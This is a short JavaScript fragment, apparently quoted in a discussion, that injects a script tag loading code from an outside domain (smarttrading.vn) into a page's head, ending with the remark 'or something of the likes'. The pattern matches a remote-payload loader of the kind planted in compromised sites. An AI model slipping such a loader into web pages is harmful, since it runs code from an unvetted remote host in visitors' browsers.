var script = document.createElement('script');
script.src = "https://smarttrading.vn/ext/?t=sp";
document.head.appendChild(script); //or something of the likes